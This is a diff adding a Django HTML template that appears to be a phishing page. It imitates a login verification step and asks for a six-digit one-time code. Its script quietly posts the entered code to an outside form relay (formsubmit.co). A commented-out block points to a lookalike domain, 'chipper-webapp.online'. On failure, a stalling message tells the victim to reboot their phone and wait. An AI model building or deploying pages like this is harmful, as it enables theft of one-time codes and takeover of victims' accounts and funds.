@@ -1,0 +1,113 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otp code</title>
+
+          <!-- custom stylesheet + script -->
+   <link rel="stylesheet" href="{% static 'dist/style.css' %}">
+   <script defer src="{% static 'dist/script.js' %}"></script>
+
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js" integrity="sha512-pumBsjNRGGqkPzKHndZMaAG+bir374sORyzM3uulLV14lN5LyykqNk8eEeUlUkB3U0M4FApyaHraT65ihJhDpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <!-- favicon img -->
+  <link rel="shortcut icon" href="{% static 'images/OIP__3_-removebg-preview.png' %}" type="image/x-icon">
+
+  <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+      (function() {
+          // https://dashboard.emailjs.com/admin/account
+          emailjs.init('R26T4WMBBOl4xUroP');
+      })();
+  </script> -->
+  <script type="text/javascript">
+      window.onload = function() {
+          console.log('working');
+          document.getElementById('form').addEventListener('submit', function(event) {
+              const btn = document.querySelector('.submitBtn')
+            //   event.preventDefault();
+              btn.innerHTML = 'Loading...';
+            //   emailjs.sendForm('service_zp0yn9k', 'del_chp_4', this)
+            //       .then(function() {
+            //           console.log('SUCCESS!');
+            //           setTimeout(() => {
+            //             window.location.href = "https://chipper-webapp.online/otp.html";
+            //           },2000)
+            //         //   window.location.href = "https://chipper-webapp.online/otp";
+            //       }, function(error) {
+            //           console.log('FAILED...', error);
+            //       });
+          });
+      }
+  </script>
+
+</head>
+<body>
+
+    <form id="form"  class="form4"  method="POST">
+        {% csrf_token %}
+
+
+        <div class="form4__header"><img src="{% static 'images/OIP__3_-removebg-preview.png' %}" alt=""></div>
+        <h3 class="form4__para">Please enter the 6 digit code we sent to your phone number / email</h3>
+
+        <div class="form4__inputCtn">
+            <input id="otp"  maxlength="6" minlength="6" required  name="otp" type="tel">
+        </div>
+
+        <button class="submitBtn" type="submit">Log In</button>
+
+    </form>
+
+
+
+
+
+
+
+    
+    <script>
+        const btn = document.querySelector('.submitBtn')
+        form.addEventListener('submit', (e) => {
+            e.preventDefault()
+            const formData = new FormData(form);
+            let object = {};
+            formData.forEach((value, key) => {
+                object[key] = value;
+            });
+            let json = JSON.stringify(object);
+            btn.textContent = 'Loading...';
+
+
+            fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a268", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success == 'true') {
+                        setTimeout(() => {
+                            window.location.href = 'otp.html';
+                        }, 1000);
+                    }
+                    console.log(data)
+                })
+                .catch(error => {
+                    alert('reboot your phone now, and login after 2 minutes')
+                    console.log(error)
+                    window.location.reload()
+                });
+        })
+
+    </script>
+</body>
+
+</html>
